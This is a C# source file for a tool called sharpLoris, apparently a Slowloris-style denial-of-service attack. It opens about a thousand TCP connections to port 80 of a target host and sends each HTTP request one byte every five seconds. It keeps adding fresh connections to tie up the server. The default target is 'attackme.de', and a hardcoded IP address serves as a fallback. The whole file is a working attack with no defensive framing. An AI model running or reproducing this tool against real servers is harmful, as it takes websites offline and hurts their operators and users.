using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Concurrent;
using System.Net;
using System.Diagnostics;

namespace sharpLoris
{
    class TCPHcoll
    {
        public bool removeflag { get; set; }
        public bool removeflag_WRITECLOSED { get; set; }
        public TcpClient tcpcli { get; set; }
        public NetworkStream ns { get; set; }
        public Queue<byte> bqueue { get; set; }
        public TCPHcoll(string host, int port, byte[] queue)
        {

            AsyncCallback cllbck = new AsyncCallback((IAsyncResult result) => {
                if (tcpcli.Connected)
                {
                    tcpcli.SendTimeout = int.MaxValue;
                    tcpcli.ReceiveTimeout = int.MaxValue;
                    ns = tcpcli.GetStream();
                    ns.WriteTimeout = int.MaxValue;
                }
                else
                    removeflag = true;
            });
            removeflag = false;
            tcpcli = new TcpClient(AddressFamily.InterNetwork);
            tcpcli.BeginConnect(host, port, cllbck, null);
            bqueue = new Queue<byte>(queue);
            

        }
        ~TCPHcoll(){
            Dispose();
        }
        public void Dispose()
        {
            tcpcli.Close();
            bqueue = null;
        }
    }
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length == 0)
                args = new string[] { "attackme.de"};

            IPAddress IP;
            foreach (var item in args)
            {
                if (IPAddress.TryParse(item,out IP))
                {
                    Console.WriteLine(HttpRequestAsync(item));
                }else if (IsValidDomainName(item))
                {
                    Console.WriteLine(HttpRequestAsync(item));
                }
            }

            Console.WriteLine("Closing this..10 secs");
            Thread.Sleep(10000);
           
        }
        private static bool IsValidDomainName(string name)
        {
            return Uri.CheckHostName(name) != UriHostNameType.Unknown;
        }
        private static string HttpRequestAsync(string target = "92.222.81.39")
        {

            var hlist = new List<TCPHcoll>();
            string result = string.Empty;
            byte[] header;
            if (File.Exists("header.txt"))
            {
                Console.WriteLine("Found header file, loading...");
                var helpr = File.ReadAllText("header.txt").Replace("%host%", target);

                header = UTF8Encoding.UTF8.GetBytes(helpr);
            }
            else
            {
                Console.WriteLine("Found no header file, loading default one");
                var builder = new StringBuilder();
                builder.AppendLine("GET / HTTP/1.1");
                builder.AppendLine(String.Format("Host: {0}",target));
                builder.AppendLine("Connection: close");
                builder.AppendLine();
                header = Encoding.ASCII.GetBytes(builder.ToString());
            }
           
             


            for (int i = 0; i < 1000; i++)
            {
                try
                {
                    hlist.Add(new TCPHcoll(target, 80, header));
                }
                catch
                {
                    break;
                }
              
            }
            Console.WriteLine("Started {0} connections",hlist.Count);
            while(hlist.Count != 0)
            {
                int wrote = 0;
                foreach (var tchcoitem in hlist)
                {
                    if(tchcoitem.ns != null)
                    {
                        var mby = tchcoitem.bqueue.Dequeue();
                        try
                        {
                            tchcoitem.ns.WriteByte(mby);
                        }
                        catch
                        {

                        }
                        
                        wrote++;
                    }
                   
                }
                Console.WriteLine("Write cycle finished {0}", wrote);
                for (int i = 0; i < 20; i++)
                    hlist.Add(new TCPHcoll(target, 80, header));

             
                Thread.Sleep(5000);
                var emptye = (from b in hlist where b.bqueue.Count == 0 || b.removeflag == true || b.removeflag_WRITECLOSED == true select b);
                int reintegration = 0;
                if(emptye.Count() != 0)
                for (int i = emptye.Count()-1; i >= 0; i--)
                {
                        var cure = emptye.ElementAt(i);
                        cure.Dispose();
                        if (!cure.removeflag)
                        {
                            hlist.Add(new TCPHcoll(target, 80, header));
                            reintegration++;
                        }
                        hlist.Remove(cure);
                }
                if (reintegration > 0)
                {
                    for (int i = 0; i < 5; i++)
                        hlist.Add(new TCPHcoll(target, 80, header));
                    reintegration += 5;
                    Console.WriteLine("Reintegrated {0} new clients", reintegration);
                }
            }

            return "Done";
        }

        private static int BinaryMatch(byte[] input, byte[] pattern)
        {
            int sLen = input.Length - pattern.Length + 1;
            for (int i = 0; i < sLen; ++i)
            {
                bool match = true;
                for (int j = 0; j < pattern.Length; ++j)
                {
                    if (input[i + j] != pattern[j])
                    {
                        match = false;
                        break;
                    }
                }
                if (match)
                {
                    return i;
                }
            }
            return -1;
        }

    }
}
